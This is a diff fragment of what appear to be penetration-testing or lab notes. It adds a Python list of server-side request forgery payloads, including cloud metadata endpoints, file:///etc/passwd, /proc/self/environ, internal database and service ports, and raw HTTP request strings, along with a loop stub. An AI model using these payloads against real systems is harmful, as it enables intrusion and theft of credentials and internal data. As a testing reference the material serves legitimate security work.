@@ -7,10 +7,127 @@ https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4
 
 
 
+```
+ssrf_payloads = [
+    # Common URLs
+    "http://example.com",
+    "https://example.com",
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://0.0.0.0",
+    "http://192.168.1.1",
+    "http://10.0.0.1",
+    "http://172.16.0.1",
+    "http://backfire.htb",
+    
+    # Internal IPs
+    "http://169.254.169.254",  # AWS metadata service
+    "http://metadata.google.internal",  # GCP metadata service
+    "http://10.1.1.1",
+    "http://192.168.0.1",
+    "http://192.168.100.1",
+    "http://192.168.1.254",
+    "http://10.10.10.10",
+    "http://172.16.0.10",
+    
+    # Common SSRF patterns
+    "http://example.com/api?url=http://127.0.0.1:40056",
+    "http://example.com/api?url=http://localhost:40056",
+    "http://example.com/api?url=http://192.168.1.1",
+    "http://example.com/api?url=http://169.254.169.254/latest/meta-data/",
+    
+    # Localhost and loopback addresses
+    "http://localhost:40056",
+    "http://127.0.0.1:40056",
+    "http://0.0.0.0:40056",
+    
+    # Other protocols
+    "ftp://127.0.0.1",
+    "ftp://localhost",
+    "file:///etc/passwd",  # Local file access
+    "http://192.168.1.1:80",
+    
+    # Testing various HTTP methods
+    "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
+    "POST /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
+    
+    # Testing with different ports
+    "http://127.0.0.1:8080",
+    "http://127.0.0.1:3000",
+    "http://127.0.0.1:5000",
+    
+    # Testing with different paths
+    "http://127.0.0.1/api/v1/users",
+    "http://127.0.0.1/api/v1/status",
+    "http://127.0.0.1/api/v1/commands",
+    
+    # Testing with various query parameters
+    "http://127.0.0.1/api?url=http://example.com",
+    "http://127.0.0.1/api?redirect=http://localhost",
+    
+    # Testing with invalid URLs
+    "http://invalid-url",
+    "http://256.256.256.256",
+    "http://10.999.999.999",
+    
+    # Testing with different protocols
+    "https://127.0.0.1",
+    "http://[::1]",  # IPv6 localhost
+    "http://[::ffff:127.0.0.1]",  # IPv6 mapped IPv4
+    
+    # Additional common services
+    "http://127.0.0.1:9200",  # Elasticsearch
+    "http://127.0.0.1:6379",  # Redis
+    "http://127.0.0.1:3306",  # MySQL
+    "http://127.0.0.1:5432",  # PostgreSQL
+    "http://127.0.0.1:8081",  # Jenkins
+    "http://127.0.0.1:5000",  # Flask app
+    "http://127.0.0.1:8000",  # Django app
+    
+    # Testing with various internal services
+    "http://127.0.0.1:3001/api/v1/data",
+    "http://127.0.0.1:4000/api/v1/info",
+    "http://127.0.0.1:5001/api/v1/execute",
+    
+    # Testing with different HTTP methods
+    "PUT /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
+    "DELETE /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
+    
+    # Testing with various payloads
+    "http://127.0.0.1/api?url=http://example.com",
+    "http://127.0.0.1/api?url=http://localhost",
+    "http://127.0.0.1/api?url=http://192.168.1.1",
+    "http://127.0.0.1/api?url=http://169.254.169.254",
+    
+    # Testing with file access
+    "file:///etc/passwd",
+    "file:///var/log/syslog",
+    "file:///proc/self/environ",
+    
+    # Testing with local network addresses
+    "http://192.168.1.100",
+    "http://10.0.0.2",
+    "http://172.16.0.5",
+    
+    # Testing with various protocols
+    "ftp://127.0.0.1",
+    "http://[::1]",  # IPv6 localhost
+    "http://[::ffff:127.0.0.1]",  # IPv6 mapped IPv4
+]
+
+# things about life
+for payload in ssrf_payloads:
+    print(f"Testing payload: {payload}")
+    # Here you would call your SSRF function with the payload
+
+
+
+
+
 Basic SSRF v1
 
 ```
-
+```
 http://127.0.0.1:80
 http://127.0.0.1:443
 http://127.0.0.1:22
